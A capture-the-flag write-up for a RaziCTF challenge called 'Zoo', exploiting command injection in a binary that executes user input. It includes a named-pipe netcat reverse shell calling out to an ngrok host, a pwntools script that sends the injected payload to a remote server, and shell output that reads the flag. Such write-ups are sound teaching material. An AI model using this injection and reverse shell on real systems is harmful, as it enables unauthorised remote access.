You notice that when executing Zoo locally, it asks you to name an animal to feed. What actually happens is that it executes
the input that it gives "./input". By analysing the binary in ghidra you also notice that the only check is for a substring
equal to one of the animals to exist in your program. However you can't simply do Apes;ls, since then you'd run the program
"Apes", and you have no idea what that does. Thus I tried doing "a;ls;Apes", but I noticed that for some reason the output
wasn't piping to the terminal (if ran locally all output would print when exiting the program). This does however mean that
the server executes all commands that are run, but the output is hidden. The solution to this is spawning a reverse shell,
which can be done in a lot of different ways. The way I did it was with "ngrok", since I wasn't able to port forward.


First I set up a listener, for example ```nc -lvnp 1234```.

Then, I ran ngrok so that I could connect remotely ```ngrok tcp 1234```,
which set up a process listening on 2.tcp.ngrok.io 13638. Now all that needs to be done is connect a shell from the server
to my listener, which was done with the command ```mkfifo /tmp/ptsd; nc 2.tcp.ngrok.io 13638 0</tmp/ptsd | /bin/sh > /tmp/ptsd 2>&1; rm /tmp/ptsd```. What this does is create a named pipe file as /tmp/ptsd, then connect stdin to this file via nc to my listener, and stdout/stderr to /bin/sh which then executes those commands.

https://metahackers.pro/reverse-shells-101/

Full exploit below - automated with pwntools:
```py
#!/usr/bin/env python3

from pwn import *

HOST = "37.152.181.193"
PORT = 1337

#p = process("./Zoo")
p = remote(HOST, PORT)

payload = b'a;mkfifo /tmp/ptsd; nc 2.tcp.ngrok.io 13638 0</tmp/ptsd | /bin/sh > /tmp/ptsd 2>&1; rm /tmp/ptsd;Apess'

p.sendlineafter("us:", payload)
p.interactive() 
```

and output:
```
~ ❯ nc -lvnp 1234                                                                               took 2m 15s
Listening on 0.0.0.0 1234
Connection received on 127.0.0.1 58984
id
uid=1001(Zooo) gid=1001(Zooo) groups=1001(Zooo)
ls
Apes
Bats
Bears
Flag.txt
Foxes
Hogs
Lions
Tigers
Zebras
bin
run
cat Flag.txt
RaziCTF{st4y_s4f3_dur!n9_th!s_p4nd3m!c}
```
